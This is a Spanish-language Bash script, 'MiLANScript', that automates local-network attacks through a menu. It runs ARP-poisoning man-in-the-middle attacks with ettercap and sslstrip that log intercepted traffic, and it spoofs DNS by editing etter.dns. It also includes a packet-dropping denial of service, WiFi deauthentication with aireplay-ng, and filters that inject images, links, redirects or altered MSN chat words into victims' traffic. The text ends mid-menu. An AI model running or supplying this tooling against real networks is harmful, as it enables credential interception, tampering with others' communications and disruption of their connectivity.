#!/bin/bash
quit="no"
cabecera () {
sudo pkill etter
dirinicio=$("pwd")
clear
tput sgr0
tput setaf 6
echo "------------------------------------------------"
tput sgr0
tput bold
echo -e "\e[1;37m         <\e[1;37mMI\e[1;36mLAN\e[1;34mSCRIPT\e[1;36m \>\e[1;35m | 0.2"
tput sgr0
tput setaf 6
echo "------------------------------------------------"
#echo -e '\e[1;33m[>]\e[1;37m'$tugetaway'\e[1;32m '$interface''
adaptador;
if [ -z "$tugetaway" ]; #comprobamos si existe variable adaptador al inicio
then 
tugetaway=$(netstat -rn | grep 0.0.0.0 | awk '{print $2}' | grep -v "0.0.0.0" | sed -n 1,1p)
fi
if [ -z "$tuip" ]; #comprobamos si existe variable adaptador al inicio
then 
tuip=$(ifconfig $interface | grep inet: | grep -v 127 | awk '{print $2}' | cut --characters=6-20)
fi
if [ -z "$tuip" ]; #depende del idioma direc. inet: > inet addr:
then
tuip=$(ifconfig $interface | grep addr: | grep -v 127 | awk '{print $2}' | cut --characters=6-20)
fi
if [ -z "$interfaceaddr" ]; #mac
then
interfaceaddr=$(ifconfig $interface | grep HWaddr |  awk '{print $5}')
fi
if [ -z "$interfaceaddr" ];
then
interfaceaddr=$(ifconfig $interface | grep direcciónHW |  awk '{print $5}')
fi
#DESCONECTADO MSG
if [ -z "$tuip" ]; #comprobamos si existe variable adaptador al inicio
then 
echo -e "\e[1;34m[IP]\e[1;31m 'DESCONECTADO'\e[1;34m [GW]\e[1;31m 'DESCONECTADO'\e[1;34m [MAC]\e[1;37m '$interfaceaddr'"
else
echo -e "\e[1;34m[IP]\e[1;37m '$tuip'\e[1;34m [GW]\e[1;37m '$tugetaway'\e[1;34m [MAC]\e[1;37m '$interfaceaddr'"
fi 
echo ""
echo ""
ettertest;
tput bold
}

adaptador () {
if [ -z "$interface" ]; #comprobamos si existe variable adaptador al inicio
then 
echo ""
interface=$(ifconfig | grep -i "wlan" | awk '{print $1}')

if [ -z "$interface" ]; then
interface=$(ifconfig | grep "eth" | awk '{print $1}')
fi
if zenity --question --ok-label="Si" --cancel-label="Mejor no" --text="¿Utilizar este adaptador? $interface" = "Si"; then

echo -e "\e[1;33m[>]\e[1;32mAdaptador de red:\e[1;37m '$interface'"
tput sgr0
else
interface=$(zenity --entry \
--title="Introduce el adaptador" \
--text="Introduce el adaptador" \
)
echo -e "\e[1;33m[>]\e[1;32mAdaptador de red:\e[1;37m '$interface'"

tput sgr0
fi
echo ""
else
echo ""
echo -e "\e[1;33m[>]\e[1;32mAdaptador de red:\e[1;37m '$interface'"
echo ""
fi
}
ettertest () {
forward=$(cat /proc/sys/net/ipv4/ip_forward) #COMPROBAR IP_FORWARD
if [ "$forward" != 0 ]; then
tput setaf 3
tput bold
echo -e "\e[1;33m[+]\e[1;32mEl sistema enruta paquetes"
else
tput setaf 1
tput bold
echo -e "\e[1;31m[-]\e[0;37mEl sistema no enruta paquetes"
tput sgr0
fi
coment=$(grep '#redir_command_on = "iptables' /etc/etter.conf) #COMPROBAR COMENTARIO ETTER.CONF
comentoff=$(grep '#redir_command_off = "iptables' /etc/etter.conf)
if [ "$coment" = "" ] && [ "$comentoff" = "" ]; then
echo -e "\e[1;33m[+]\e[1;32mEl reenvío de tráfico está: Activado"
else
echo -e "\e[1;31m[-]\e[0;37mEl reenvío de tráfico está: Desactivado"
fi

ruleipt=$(sudo iptables -t nat -L | grep 10000) #reglas iptables
if [ "$ruleipt" = "" ]; then
tput setaf 1
tput bold
echo -e "\e[1;31m[-]\e[0;37mNo existen reglas de redirección"

tput sgr0
else
tput setaf 3
tput bold
echo -e "\e[1;33m[+]\e[1;32mRedirección puerto 80 a puerto 10000"
tput sgr0
fi
etteruid=$(grep 'ec_uid = 0' /etc/etter.conf) #COMPROBAR chroot ETTER.CONF
if [ "$etteruid" = "" ]; then
echo -e "\e[1;36m[!]\e[1;30mettercap UID = 65534"
else
echo -e "\e[1;36m[!]\e[1;30mettercap UID = 0"
fi
ettergid=$(grep 'ec_gid = 0' /etc/etter.conf) #COMPROBAR chroot ETTER.CONF
if [ "$ettergid" = "" ]; then
echo -e "\e[1;36m[!]\e[1;30mettercap GID = 65534"
else
echo -e "\e[1;36m[!]\e[1;30mettercap GID = 0"
fi
}
default () {

xterm -e echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward &
xterm -e sudo sysctl -w net.ipv4.ip_forward=0 #desactivar forward
xterm -e sudo iptables -t nat --flush
sleep 1
if [ "$coment" = "" ]; then
if [ "$comentoff" = "" ]; then
xterm -e sudo sed -ie 's/redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/g' /etc/etter.conf &
sleep 1
xterm -e sudo sed -ie 's/redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/g' /etc/etter.conf &
fi
fi
sudo cp /usr/local/share/videojak/etter.dns /usr/local/share/ettercap/etter.dns #default etter.dns
sleep 1
ettertest;
}

comprobar () {
clear

tput bold
echo "MiLANScript"
echo ""
tput setaf 3
echo "Verificando los paquetes necesarios..."
tput sgr0
echo "------------------------------------------------"
echo ""
verificacion=$(aptitude show xterm | grep Estado | awk '{print $2}')
if [ "$verificacion" = "instalado" ]; then
echo "xterm ya está instalado"
else
echo "xterm no está instalado, INSTALANDO..."

sudo apt-get --force-yes install xterm &
fi
echo "--------------------------------------------> OK"
verificacion=$(aptitude show sslstrip | grep Estado | awk '{print $2}')
if [ "$verificacion" = "instalado" ]; then
echo "sslstrip ya está instalado"
else
echo "sslstrip no está instalado, INSTALANDO..."

xterm -e sudo apt-get --force-yes install sslstrip &
fi
echo "--------------------------------------------> OK"
verificacion=$(dpkg --get-selections | grep -w ettercap-common | grep -w install | awk '{print $2}')
if [ "$verificacion" = "install" ]; then
echo "ettercap ya está instalado"
else
echo "ettercap no está instalado, INSTALANDO..."

xterm -e sudo apt-get --force-yes install ettercap &
fi
echo "--------------------------------------------> OK"
verificacion=$(aptitude show dsniff | grep Estado | awk '{print $2}')
if [ "$verificacion" = "instalado" ]; then
echo "dsniff ya está instalado"
else
echo "dsniff no está instalado, INSTALANDO..."
sleep 1
xterm -e sudo apt-get --force-yes install dsniff &
fi
echo "--------------------------------------------> OK"
verificacion=$(aptitude show driftnet | grep Estado | awk '{print $2}')
if [ "$verificacion" = "instalado" ]; then
echo "driftnet ya está instalado"
else
echo "driftnet no está instalado, INSTALANDO..."

xterm -e sudo apt-get --force-yes install driftnet &
fi
echo "--------------------------------------------> OK"
verificacion=$(aptitude show netdiscover | grep Estado | awk '{print $2}')
if [ "$verificacion" = "instalado" ]; then
echo "netdiscover ya está instalado"
else
echo "netdiscover no está instalado, INSTALANDO..."

xterm -e sudo apt-get --force-yes install netdiscover &
fi
echo "--------------------------------------------> OK"
sleep 1
echo ""
tput setaf 3
tput bold
echo "Verificación de paquetes finalizada..."
tput sgr0
sleep 2
clear
}

filtros_etter () {
#adaptador;
#cabecera;
forward=$(cat /proc/sys/net/ipv4/ip_forward) #COMPROBAR IP_FORWARD
if [ "$forward" != 0 ]; then
sleep 1
tput setaf 3
tput bold
#echo "El sistema enruta paquetes"
else
tput setaf 2
tput bold

cabecera;
echo ""
echo -e "\e[1;33m[>]\e[1;37mActivando ip_forward..."

xterm -e sudo sysctl -w net.ipv4.ip_forward=1 
sleep 1

fi
cabecera;
echo ""
echo -e "\e[1;33m[>]\e[1;37mConfigurando filtro..."
}
filtro_img () {
default;
filtros_etter;
direccionfalsa=$(zenity --entry \
--title="Filtro" \
--text="Indica la dirección de la imagen:" \
--text="https://www..." \
)
if [ "$?" == "1" ]; then
return
fi
echo -e "\e[1;33m[>]\e[1;37mCreando el filtro..."
sudo echo "if (ip.proto == TCP && tcp.dst == 1863) {" > mitmsg.filter
sudo echo "if (search(DATA.data, \"MSG\")) {" >> mitmsg.filter
sudo echo "replace(\"beso\", \"kaka\");" >> mitmsg.filter
sudo echo "msg(\"Modificando paquete ;)\\n\");" >> mitmsg.filter
sudo echo "   }" >> mitmsg.filter
sudo echo "}" >> mitmsg.filter
sudo echo "if (ip.proto == TCP && tcp.dst == 80) {" > mitm.filter
sudo echo "if (search(DATA.data, "'"Accept-Encoding"'")) {" >> mitm.filter
sudo echo "replace("'"Accept-Encoding"'", "'"Accept-Rubbish!"'");" >> mitm.filter
sudo echo "# note: replacement string is same length as original string" >> mitm.filter
sudo echo "msg("'"zapped Accept-Encoding!\n"'");" >> mitm.filter
sudo echo "   }" >> mitm.filter
sudo echo "}" >> mitm.filter
sudo echo "if (ip.proto == TCP && tcp.src == 80) {" >> mitm.filter
sudo echo "replace("'"img src="', '"img src=\"http://www.irongeek.com/images/jollypwn.png\" ");' >> mitm.filter
sudo echo "replace("'"IMG SRC="', '"img src=\"http://www.irongeek.com/images/jollypwn.png\" ");' >> mitm.filter
sudo echo "msg("'"Filtro aplicado.\n" '");" >>  mitm.filter
sudo echo "}" >> mitm.filter
sleep 1
if [ "$direccionfalsa" != "" ]; then
sudo sed -ie 's#http://www.irongeek.com/images/jollypwn.png#'$direccionfalsa'#g' mitm.filter &
fi
sleep 1
echo -e "\e[1;33m[>]\e[1;37mCompilando..."
xterm -e sudo etterfilter mitm.filter -o mitm.ef &
tput sgr0
sleep 1
#sudo rm mitm.filter
#mv mitm.filtere mitm.filter
# echo "Iniciando ataque..."

objetivo;
cabecera;
echo ""
echo -e "\e[1;33m[>]\e[1;37mInyectar imagen \e[1;36m$direccionfalsa" 
ripobj=$(zenity --list --column "Opciones:" $netd  --text "IP Objetivo:" --title="MiLanScript" --height=220 --width=250)
echo ""
echo -e "\e[1;33m[XSScripting]\e[1;37mPRESIONA Q PARA SALIR !"
xterm -e sudo ettercap -i $interface -T -q -F mitm.ef -M arp // /$ripobj/ -P autoadd 

}
filtro_txt () {
filtros_etter;
direccionfalsa=$(zenity --entry \
--title="Filtro" \
--text="Indica la dirección de la imagen:" \
--text="https://www..." \
)
sudo echo "if (ip.proto == TCP && tcp.dst == 80) {" > mitm.filter
sudo echo "if (search(DATA.data, "'"Accept-Encoding"'")) {" >> mitm.filter
sudo echo "replace("'"Accept-Encoding"'", "'"Accept-Rubbish!"'");" >> mitm.filter
sudo echo "# note: replacement string is same length as original string" >> mitm.filter
sudo echo "msg("'"zapped Accept-Encoding!\n"'");" >> mitm.filter
sudo echo "   }" >> mitm.filter
sudo echo "}" >> mitm.filter
sudo echo "if (ip.proto == TCP && tcp.src == 80) {" >> mitm.filter
sudo echo "replace("'"a href="', '"a href=\"http://www.irongeek.com/images/jollypwn.png\" ");' >> mitm.filter
sudo echo "replace("'"A HREF="', '"A HREF=\"http://www.irongeek.com/images/jollypwn.png\" ");' >> mitm.filter
sudo echo "msg("'"Filtro aplicado.\n"'");" >>  mitm.filter
sudo echo "}" >> mitm.filter


sleep 1
echo "Creando el filtro..."
if [ "$direccionfalsa" != "" ]; then
sudo sed -ie 's#http://www.irongeek.com/images/jollypwn.png#'$direccionfalsa'#g' mitm.filter &
fi
sleep 1
echo "Compilando..."
xterm -e sudo etterfilter mitm.filter -o mitm.ef &
tput sgr0
sleep 1
#sudo rm mitm.filter
#mv mitm.filtere mitm.filter
# echo "Iniciando ataque..."
objetivo;
ripobj=$(zenity --list --column "Opciones:" $netd  --text "IP Objetivo:" --title="MiLanScript" --height=220 --width=250)
xterm -hold -e sudo ettercap -i $interface -T -q -F mitm.ef -M arp // /$ripobj/ -P autoadd &
cabecera;
echo Inyectando imagen: $direccionfalsa
}
filtro_redir () {
if [ -f mitm.filter ]; then #default
sudo rm mitm.filter
fi
default;
filtros_etter;
if [ "$urlred" = "" ]; then #default
#urlred="htcmania.com"
urlred=$(zenity --entry \
--title="Introduce URL destino" \
--text="URL: http://www..." \
)
fi
if [ "$?" == "1" ]; then
return
fi
if [ -z "$urlred" ]; then #default
return
fi
urlnum=$(echo $urlred | grep "^-\?[0-9,.]*$")
if [ "$urlnum" == "$urlred" ] ; then
echo -e "\e[1;33m[>]\e[1;37m$urlnum" #muestra ip local
ipresuelta="$urlred"
else
ipresuelta=$(host $urlred | awk '{print $4 ; exit}')
echo -e "\e[1;33m[>]\e[1;37m$ipresuelta\e[1;34m $urlred"
fi
#if [ "$ipresuelta" = "found:" ]; then #default
#ipresuelta="$urlred"
#fi
sleep 1
#html
sudo echo '<html><head>' > /tmp/redirect.txt
sudo echo '<meta http-equiv="Refresh" content="0; URL=''http://'$urlred'">' >> /tmp/redirect.txt
sudo echo '</head><body></body></html>' >> /tmp/redirect.txt
#filtro
sudo echo "if (ip.proto == TCP && tcp.dst == 80) {" > mitm.filter
sudo echo "if (search(DATA.data, "'"Accept-Encoding"'")) {" >> mitm.filter
sudo echo "replace("'"Accept-Encoding"'", "'"Accept-Rubbish!"'");" >> mitm.filter
sudo echo "# note: replacement string is same length as original string" >> mitm.filter
sudo echo "msg("'"zapped Accept-Encoding!\n"'");" >> mitm.filter
sudo echo "   }" >> mitm.filter
sudo echo "}" >> mitm.filter
sudo echo "if (ip.proto == TCP && ip.dst != '$ipresuelta' && ip.src != '$ipresuelta' && tcp.src == 80) {" >> mitm.filter
sudo echo 'if ( regex(DATA.data, "<head>.*")){' >> mitm.filter
sudo echo "drop();" >> mitm.filter
sudo echo 'inject("/tmp/redirect.txt");' >> mitm.filter
sudo echo "msg("'"Filtro aplicado.\n"'");" >>  mitm.filter
sudo echo "}" >> mitm.filter
sudo echo "}" >> mitm.filter
sleep 1
echo -e "\e[1;33m[>]\e[1;37mCreando filtros"
sleep 1
echo -e "\e[1;33m[>]\e[1;37mCompilando..."
xterm -e sudo etterfilter mitm.filter -o mitm.ef &
tput sgr0
sleep 1
#rm mitm.filter
#mv mitm.filtere mitm.filter
# echo "Iniciando ataque..."
objetivo;
ripobj=$(zenity --list --column "Opciones:" $netd  --text "IP Objetivo:" --title="MiLanScript" --height=220 --width=250)
cabecera;
#return
echo Inyectando html: $urlred
echo -e "\e[1;33m[DNS SPOOFING]\e[1;37mPRESIONA Q PARA SALIR !"
xterm -e sudo ettercap -i $interface -T -q -F mitm.ef -M arp // /$ripobj/ -P autoadd 
}

objetivo () {
cabecera;
echo ""
echo -e "\e[1;33m[>]\e[1;37mEscaneando la red..."
#tuip=$(ifconfig $interface | grep 'inet addr:' | awk '{print $2}' | cut --characters=6-20)
sudo netdiscover -i $interface -P -r 192.168.1.0/24 > netd
netd=$(tail netd | grep [1234567890] | grep -v - |  grep -v IP | awk '{print $1}') #todas las ips
netdm=$(tail netd | grep [1234567890] | grep -v Active | awk '{print $2}') #todas las mac

#echo -e "\e[1;33m[>]\e[1;37mElige objetivo"

}

desaut () {

ipobj=$(zenity --list --column "Opciones:" $netd  --text "IP Router" --title="MiLanScript" --height=200 --width=250) #selecciona entre todas las ips
ipobjvar=$(grep "$ipobj " netd | awk '{print $2}') #guarda mac de ip seleccionada
ripobj=$(zenity --list --column "Opciones:" $netd  --text "IP Objetivo:" --title="MiLanScript" --height=200 --width=250)
ripobjvar=$(grep "$ripobj " netd | awk '{print $2}') #guarda mac de ip seleccionada
echo ""
echo "Desautentificar $ipobjvar $ripobjvar"
if zenity --question --ok-label="Si" --cancel-label="Mejor no" --text="¿Desautentificar $ripobj?" = "Si"; then
echo ""
echo "Estableciendo modo monitor en $interface"
sudo airmon-ng start $interface
clear
echo "Desautentificando: aireplay-ng -0 0 -a $ipobjvar -c $ripobjvar mon0"
sudo aireplay-ng -0 0 -a $ipobjvar -c $ripobjvar mon0
fi

#ipobjmac=$(zenity --list --column "Opciones:" $ipobjvar  --text "IP Objetivo:" --title="SSLScript 1.0" --height=200 --width=250)

#elegido=$(zenity --list --column "Opciones:" $netdm  --text "Punto de acceso:" --title="SSLScript 1.0" --height=200 --width=250) | 
#elemac=$(zenity --list --column "Opciones:" $netdm --text "Cliente" --title="SSLScript 1.0" --height=200 --width=250) | less netd
sleep 2
}

inic_mitm () {
xterm -e echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward &
xterm -e sudo sysctl -w net.ipv4.ip_forward=0 #desactivar forward
xterm -e sudo iptables -t nat --flush
if [ "$coment" != "" ]; then
xterm -e sudo sed -ie 's/#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/g' /etc/etter.conf &
xterm -e sudo sed -ie 's/#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/g' /etc/etter.conf &
fi
xterm -e iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
cabecera; 



#tugetaway=$(netstat -rn | grep 0.0.0.0 | awk '{print $2}' | grep -v "0.0.0.0")
# /sbin/ip route | awk '/default/ { print  }' Puerta de enlace

#cabecera;
objetivo;

echo -e "\e[1;33m[>]\e[1;37mConfigurando..."
sleep 1
#penlaces=$(zenity --entry --text "Puerta de enlace:" --title="MiLanScript" --height=220 --width=250)
#tugetaway=$(netstat -rn | grep 0.0.0.0 | awk '{print $2}' | grep -v "0.0.0.0" | sed -n 1,1p)
if zenity --question --ok-label="Si" --cancel-label="Cambiar" --text="¿Puerta de enlace "$tugetaway"?" = "Si"; then
penlaces=$tugetaway
else
penlaces=$(zenity --entry \
--title="Puerta de enlace:" \
--text="$tugetaway" \
--entry-text="$tugetaway" \
) 

fi

#if [ -z "$penlaces" ]; then

if [ "$?" == "1" ]; then
return
fi
#fi
if [ "$penlaces" = "" ]; then 
echo -e "\e[1;34m[+]\e[1;36mGRUPO 1: \e[1;37mTodos los host de la lista"
else
echo -e "\e[1;34m[+]\e[1;36mGRUPO 1: \e[1;37m$penlaces"
fi

victima=$(zenity --list --column "Opciones:" $netd  --text "IP Objetivo:" --title="MiLanScript" --height=220 --width=250)
if [ -z "$victima" ]; then
victima=$(zenity --entry \
--title="IP Objetivo:" \
--text="* Todos los hosts" \
--entry-text="$victima" \
) 
if [ "$?" == "1" ]; then
return
fi
fi
if [ "$victima" = "" ]; then 
echo -e "\e[1;34m[+]\e[1;36mGRUPO 2: \e[1;37mTodos los host de la lista"
else
echo -e "\e[1;34m[+]\e[1;36mGRUPO 2: \e[1;37m$victima"
fi
echo -e "\e[1;33m[>]\e[1;37mIniciando..."

sslstrip=$(locate sslstrip.py | awk '{print $1; exit}')
xterm -iconic -e sudo python $sslstrip -k -p -w LOG-SSL &
sleep 2


if zenity --question --ok-label="Si" --cancel-label="Mejor no" --text="¿Autoañadir víctimas?" = "Si"; then

	xterm -e ettercap -Tqi $interface -P autoadd -M arp:remote /$victima/ /$penlaces/ &
	else
	xterm -e ettercap -Tqi $interface -M arp:remote /$victima/ /$penlaces/ &
fi
sleep 2
if zenity --question --ok-label="Si" --cancel-label="Mejor no" --text="¿driftnet?" = "Si"; then
echo ""
echo "Iniciando driftnet"
xterm -hold -e driftnet -i $interface &
fi
if zenity --question --ok-label="Si" --cancel-label="Mejor no" --text="¿ultrasurf?" = "Si"; then
echo ""
echo "Iniciando urlsnarf"
xterm -hold -e urlsnarf -i $interface &
fi

clear
tput sgr0
tput setaf 6
echo "------------------------------------------------"
tput sgr0
tput bold
echo -e "\e[1;37m         <\e[1;37mMI\e[1;36mLAN\e[1;34mSCRIPT\e[1;36m \>\e[1;35m | 0.3"
tput sgr0
tput setaf 6
echo "------------------------------------------------"
#echo -e '\e[1;33m[>]\e[1;37m'$tugetaway'\e[1;32m '$interface''
adaptador;
if [ -z "$tugetaway" ]; #comprobamos si existe variable adaptador al inicio
then 
tugetaway=$(netstat -rn | grep 0.0.0.0 | awk '{print $2}' | grep -v "0.0.0.0" | sed -n 1,1p)
fi
if [ -z "$tuip" ]; #comprobamos si existe variable adaptador al inicio
then 
tuip=$(ifconfig $interface | grep inet: | grep -v 127 | awk '{print $2}' | cut --characters=6-20)
fi
if [ -z "$tuip" ]; #depende del idioma direc. inet: > inet addr:
then
tuip=$(ifconfig $interface | grep addr: | grep -v 127 | awk '{print $2}' | cut --characters=6-20)
fi
if [ -z "$interfaceaddr" ]; #mac
then
interfaceaddr=$(ifconfig $interface | grep HWaddr |  awk '{print $5}')
fi
if [ -z "$interfaceaddr" ];
then
interfaceaddr=$(ifconfig $interface | grep direcciónHW |  awk '{print $5}')
fi
echo -e "\e[1;34m[IP]\e[1;37m '$tuip'\e[1;34m [GW]\e[1;37m '$tugetaway'\e[1;34m [MAC]\e[1;37m '$interfaceaddr'"
echo ""
ettertest;
tput bold
echo ""
echo -e "\e[1;33m[Man.In.The.Middle]\e[1;37mPRESIONA Q PARA SALIR !"

tput sgr0
echo ""
xterm -e sudo tail -f LOG-SSL
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""


}
inic_dnss () {
default;
adaptador;
cabecera;
#echo "------------------------------------------------"
#echo "Spoofear DNS:"
#echo "------------------------------------------------"
filtros_etter;
redir=$(zenity --entry \
--title="Url: https://..." \
--text="* Todos los hosts" \
)
if [ "$?" == "1" ]; then
return
fi
if [ -z "$redir" ]; #comprobamos si existe variable url
then
redir=""
fi
redirip=$(zenity --entry \
--title="IP Spoof:" \
--text="Redirigir a IP" \
)
if [ "$?" == "1" ]; then
return
fi
if [ -z "$redirip" ]; #comprobamos si existe variable ip
then
redirip="198.182.196.56"
return
fi
cabecera;
tput setaf 3
tput bold
echo ""
echo -e "\e[1;33m[>]\e[1;37mConfigurando el equipo para el ataque"
tput sgr0
echo -e "\e[1;33m[>]\e[1;37mConfigurando etter.dns"
etterdns=$(locate etter.dns | grep ettercap | sed -n 1,1p) #muestra varias rutas
if [ -z "$etterdns" ]; #comprobamos si existe variable ip
then
etterdns=$(locate etter.dns | grep ettercap | sed -n 2,2p) #muestra varias rutas
fi
sudo cp $etterdns $dirinicio #copia
if [ -z "$redir" ]; #en el caso de redireccionar todo
then
sudo sed -i "s/microsoft.com      A   198.182.196.56/$redir/g" $etterdns &
sudo sed -i "s/*.microsoft.com    A   198.182.196.56/$redir/g" $etterdns &
sudo sed -i "s/www.microsoft.com  PTR 198.182.196.56/* A $redirip/g" $etterdns &
else #redireccionar solo
sudo sed -i "s/microsoft.com/$redir/g" $etterdns &
sudo sed -i "s/198.182.196.56/$redirip/g" $etterdns &
fi

objetivo;


ripobj=$(zenity --list --column "Opciones:" $netd  --text "IP Objetivo:" --title="MiLanScript" --height=220 --width=250)
#tugetaway=$(netstat -rn | grep 0.0.0.0 | awk '{print $2}' | grep -v "0.0.0.0" | sed -n 1,1p)
cabecera;
echo "" 
echo -e "\e[1;33m[DNS Spoofing]\e[1;37mPRESIONA Q PARA SALIR !"
xterm -e sudo ettercap -Tqi $interface /$ripobj/ /$tugetaway/ -M ARP:REMOTE -P dns_spoof
echo -e "\e[1;33m[DNS Spoofing]\e[1;37mRestableciendo"

sudo cp $dirinicio/etter.dns $etterdns #restauramos etter.dns
sleep 1
}
dos () {
default;
cabecera;
filtros_etter;
tput bold
objetivo;
ipobj=$(zenity --list --column "Opciones:" $netd  --text "IP: (Denegación de servicio)" --title="SSLScript" --height=220 --width=250) #selecciona entre todas las ips
if [ "$ipobj" = "" ]; then #si no está en la lista, introduce ip
ipobj=$(zenity --entry \
--title="Configurar arpspoof." \
--text="IP:" \
)
fi

if [ "$ipobj" != "" ]; then #si no introduces ip end

#sudo rm dos.eft
#sudo rm DoS.ef
sudo echo "if (ip.src == '$ipobj' || ip.dst == '$ipobj')" > dos.eft
sudo echo "{" >> dos.eft
sudo echo "drop();" >> dos.eft
sudo echo "kill();" >> dos.eft
sudo echo "msg("'"Paquete desde "'$ipobj'" rechazado\n"'");" >> dos.eft
sudo echo "}" >> dos.eft
xterm -e sudo etterfilter dos.eft -o DoS.ef
sleep 1
cabecera;
echo ""
echo -e "\e[1;33m[D.O.S.]\e[1;37mPRESIONA Q PARA SALIR !"

xterm -e sudo ettercap -TqF DoS.ef -i $interface -M ARP /$ipobj/ //
fi



}
salida_x () {
clear
sleep 2
echo "Desactivando ip_forward"
xterm -e echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward &
sudo iptables -t nat --flush
echo "--------------------------------------------> OK"
sleep 2
echo ""
echo "Eliminando posibles filtros creados"
echo""
nohup rm imagen.ef
nohup rm msg.ef
echo ""
echo "--------------------------------------------> OK"
sleep 2
echo ""
echo "Configurando etter.conf"
xterm -e sudo sed -ie 's/redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/g' /etc/etter.conf &
xterm -e sudo sed -ie 's/redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/g' /etc/etter.conf &
echo "--------------------------------------------> OK"
sleep 2
rm mitm.filter
rm mitmsg.filter
rm nohup.out
clear
}

camb_msn () {
clear
echo "------------------------------------------------"
echo "Cambiar los mensajes salientes de msn"
echo "------------------------------------------------"
sleep 1
echo ""
echo "Indica primero quÃ© palabra quieres cambiar"
echo "Ej: hola"
echo "------------------------------------------------"
convfalsa=$(zenity --entry \
--title="Creando filtro ettercap .:MITM:." \
--text="Indica primero quÃ© palabra quieres cambiar" \
)
cp mitmsg.filter mitmsg.filter1
xterm -e sudo sed -ie 's/beso/'$convfalsa'/g' mitmsg.filter &
echo ""
rm mitmsg.filtere
echo "Indica la palabra que sustituirá a la anterior"
echo "Ej: perra"
echo "------------------------------------------------"
convfalsa1=$(zenity --entry \
--title="Creando filtro ettercap .:MITM:." \
--text="Indica la palabra que sustituirá a la anterior" \
)
xterm -e sudo sed -ie 's/kaka/'$convfalsa1'/g' mitmsg.filter &
rm mitmsg.filtere
sleep 1
echo "Creando el filtro..."
xterm -e etterfilter mitmsg.filter -o msg.ef &
echo "--------------------------------------------> OK"
rm mitmsg.filter
mv mitmsg.filter1 mitm.filter
echo "Iniciando ataque..."
xterm -hold -e ettercap -i $interface -T -q -F msg.ef -M ARP /$penlaces/ // &
echo "--------------------------------------------> OK"
sleep 1
}
while [ $quit != "yes" ]
do
cabecera;
echo ""
echo -n -e "\e[1;33m[>]\e[1;37mEsperando acción..."
echo ""
echo ""
echo ""
echo ""
echo ""
tput setaf 1
echo "[!]: WEBs con HSTS bloquean auditorÃ­as SSL"
tput setaf 1
echo "[!]: Una mala configuración puede bloquear todo el tráfico de la red"
tput sgr0

eleccion=$(zenity --list --column "Opciones:" "Configuración" "Buscar objetivo" "Man-in-the-middle" "DNS Spoofing" "Denegación de Servicio" "Redirección" "XSScripting" "Cambiar HTTPS" "Salir" --text "Escoje acción:" --title="MiLANScript" --height=217 --width=250)
#if [ "$eleccion" = "Comprobar paquetes" ]; then
#comprobar;
if [ "$eleccion" = "Configuración" ]; then #CONFIG.
clear
cabecera;
echo ""
echo -n -e "\e[1;33m[>]\e[1;37mEsperando acción..."
eleconf=$(zenity --list --column "Opciones:" "Adaptador de red" "Cambiar MAC" "Activar redirección" "Configurar etter.conf" "Reglas iptables" "UID GID ettercap" "Puerta de enlace" "Ajustes por defecto" "Volver" --text "Escoje acción:" --title="MiLANScript" --height=217 --width=250)
if [ "$eleconf" = "Activar redirección" ];then
sudo sysctl -w net.ipv4.ip_forward=1
sleep 1
cabecera;
elif [ "$eleconf" = "Configurar etter.conf" ]; then
xterm -e sudo sed -ie 's/#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/g' /etc/etter.conf &
xterm -e sudo sed -ie 's/#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"/g' /etc/etter.conf &
sleep 3
elif [ "$eleconf" = "Reglas iptables" ]; then
xterm -e iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
cabecera;
elif [ "$eleconf" = "Puerta de enlace" ]; then

tugetawayman=$(zenity --entry \
--title="Puerta de enlace" \
--text="Puerta de enlace" \
)
#sudo route del default gw $tugetaway $interface
#tugetaway=$tugetawayman

sudo route add default gw $tugetawayman $interface
xterm -e sudo /etc/init.d/networking restart
elif [ "$eleconf" = "Ajustes por defecto" ]; then
default;
elif [ "$eleconf" = "Adaptador de red" ]; then
adaptador;
if zenity --question --ok-label="Si" --cancel-label="Mejor no" --text="¿Utilizar este adaptador? $interface" = "Si"; then

tput sgr0
else
interface=$(zenity --entry \
--title="Introduce el adaptador" \
--text="Introduce el adaptador" \
)

tput sgr0
fi
fi
elif [ "$eleccion" = "Buscar objetivo" ]; then
echo ""
objetivo;
zenity --list --column "Opciones:" $netd  --text "IP Objetivo:" --title="MiLanScript" --height=220 --width=250
#tugetaway=$(netstat -rn | grep 0.0.0.0 | awk '{print $2}' | grep -v "0.0.0.0" | sed -n 1,1p)
cabecera;
elif [ "$eleccion" = "Man-in-the-middle" ]; then
inic_mitm;
elif [ "$eleccion" = "DNS Spoofing" ]; then
inic_dnss;
elif [ "$eleccion" = "Denegación de Servicio" ]; then
dos;
